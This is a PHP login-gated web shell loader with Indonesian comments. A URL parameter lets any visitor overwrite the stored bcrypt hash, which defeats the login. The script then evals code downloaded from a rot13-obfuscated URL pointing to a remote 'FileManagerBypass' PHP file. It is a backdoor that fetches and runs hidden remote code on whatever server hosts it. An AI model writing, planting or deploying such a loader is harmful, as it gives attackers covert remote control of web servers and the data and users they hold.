<?php
session_start();

// Hash bcrypt awal untuk username (default)
$stored_username_hash = $_SESSION['stored_username_hash'] ?? '$2a$12$D4O2lxj4K.W09hR4vQCXhuxMTVUi8z31BqfntIaYHROdSN8FOdVQ2'; // Hash dari "admin"

// Fungsi untuk mengganti hash melalui URL
function update_stored_username_hash($new_hash) {
    if (password_get_info($new_hash)['algoName'] === 'bcrypt') { // Validasi apakah hash menggunakan bcrypt
        $_SESSION['stored_username_hash'] = $new_hash;
        echo '<p style="color: green;">Hash username berhasil diperbarui!</p>';
    } else {
        echo '<p style="color: red;">Hash tidak valid. Pastikan hash menggunakan bcrypt.</p>';
    }
}

// Periksa apakah ada parameter `ubahhash`
if (isset($_GET['ubahhash'])) {
    $new_hash = trim($_GET['ubahhash']);
    update_stored_username_hash($new_hash);
}

// Fungsi untuk menampilkan halaman login
function show_login_form($error = '') {
    echo '<!DOCTYPE html>
    <html>
    <head><title>Login</title></head>
    <body>
        <h2>Login</h2>
        ' . ($error ? '<p style="color: red;">' . htmlspecialchars($error) . '</p>' : '') . '
        <form method="post">
            <label>Username: <input type="text" name="username"></label><br>
            <button type="submit">Login</button>
        </form>
    </body>
    </html>';
    exit;
}

// Periksa apakah pengguna sudah login
if (!isset($_SESSION['logged_in']) || $_SESSION['logged_in'] !== true) {
    if ($_SERVER['REQUEST_METHOD'] === 'POST') {
        $username = trim($_POST['username'] ?? '');

        // Validasi username menggunakan bcrypt
        if (password_verify($username, $stored_username_hash)) {
            $_SESSION['logged_in'] = true;
        } else {
            show_login_form("Username salah.");
        }
    } else {
        // Tampilkan form login jika belum ada data POST
        show_login_form();
    }
}

// Kode asli Anda (dijalankan hanya jika sudah login)
@eval("?>" . @file_get_contents(str_rot13("uggcf://enj.tvguhohfrepbagrag.pbz/AbboGrpub/j/ersf/urnqf/znva/SVyrZnantreOlcnff/jbbc-nfpvv.cuc")));
?>
